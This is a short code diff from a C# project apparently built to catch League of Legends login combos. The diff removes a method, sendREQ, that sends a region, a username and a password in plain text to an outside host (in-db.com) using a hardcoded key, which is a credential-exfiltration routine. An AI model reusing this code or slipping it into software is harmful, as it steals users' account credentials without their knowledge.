@@ -276,24 +276,7 @@ namespace _LOL____LOGINS_COMBO_CATCHER
             
         }
 
-        public void sendREQ(string region, string login, string pass)
-        {
-            try
-            {
-                HttpClient client = new HttpClient();
 
-
-                client.GetAsync("http://in-db.com/add_lol.php?add&key=vomer0909&region="+region+"&login="+login+"&pass="+pass)
-                      .ContinueWith(responseTask =>
-                      {
-                          Console.WriteLine("Response: {0}", responseTask.Result);
-                      });
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine(ex.ToString());
-            }
-        }
 
     }
 }
